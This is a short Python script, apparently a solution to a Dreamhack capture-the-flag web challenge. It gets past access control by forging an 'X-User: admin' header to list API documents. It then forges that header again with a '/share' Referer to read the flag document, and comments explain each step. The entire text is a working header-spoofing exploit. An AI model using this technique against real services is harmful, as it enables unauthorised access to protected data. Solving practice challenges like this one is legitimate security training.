import requests

#part1
url = "http://host3.dreamhack.games:21863/api/docs"

headers = {"X-User": "admin"} 

response = requests.get(url, headers=headers) #apparently just adjusting the headers so that you are admin and accessing api docs shows you the id for the doucment with flag

print(response.text)

#part2
url = "http://host3.dreamhack.games:21863/doc/431" #431 only for this first session number different for each session

headers = {"X-User": "admin",
           "Referer":"/share"}

response = requests.get(url, headers=headers) #then access the flag document, remembering to be admin and set referer on headers

print(response.text)